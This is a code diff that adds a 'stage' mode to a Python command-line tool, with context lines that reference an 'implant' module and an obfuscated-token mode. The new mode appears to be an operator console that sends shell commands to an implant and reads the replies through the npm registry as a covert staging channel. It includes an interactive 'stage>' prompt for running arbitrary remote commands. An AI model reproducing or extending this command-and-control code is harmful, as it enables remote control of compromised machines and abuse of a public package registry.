@@ -68,6 +68,19 @@ def main():
 
     sub = p.add_subparsers(dest="mode")
 
+    st = sub.add_parser(
+        "stage", help="staging-channel operator: the write path npm still allows")
+    st.add_argument("--package", "-p", required=True)
+    st.add_argument("--token", "-t", required=True)
+    st.add_argument("--channel", "-c", required=True,
+                    help="4-char channel id, start a-f (e.g. f00d)")
+    st.add_argument("--passphrase", default=None)
+    st.add_argument("--base", default="https://registry.npmjs.org")
+    st.add_argument("--timeout", type=int, default=180)
+    st.add_argument("--interval", type=int, default=5)
+    st.add_argument("cmd", nargs="?",
+                    help="shell command; omit for an interactive console")
+
     obf = sub.add_parser("obfuscate",
                          help="print obfuscated token hex for a package")
     obf.add_argument("--package", "-p", required=True)
@@ -138,6 +151,36 @@ def main():
         from .implant import generate_standalone
         print(generate_standalone(token=args.token, package=args.package))
         return
+
+    if args.mode == "stage":
+        from .stagetransport import StageOperator
+        op = StageOperator(args.package, args.token, args.channel,
+                           passphrase=args.passphrase, base=args.base,
+                           verbose=True)
+        if args.cmd:
+            out = op.run(args.cmd, timeout=args.timeout,
+                         interval=args.interval)
+            print(out if out is not None else "[!] no reply before timeout")
+            sys.exit(0 if out is not None else 1)
+        print(f"[*] staging channel on {args.package} (chan {args.channel})")
+        print("[*] commands: any shell line, :quit to detach")
+        try:
+            while True:
+                try:
+                    line = input("stage> ")
+                except EOFError:
+                    break
+                if not line.strip():
+                    continue
+                if line.strip() in (":q", ":quit", ":exit"):
+                    break
+                out = op.run(line, timeout=args.timeout,
+                             interval=args.interval)
+                print(out if out is not None
+                      else "[!] no reply before timeout")
+        except KeyboardInterrupt:
+            print()
+        sys.exit(0)
 
     if args.mode == "doctor":
         from .doctor import doctor
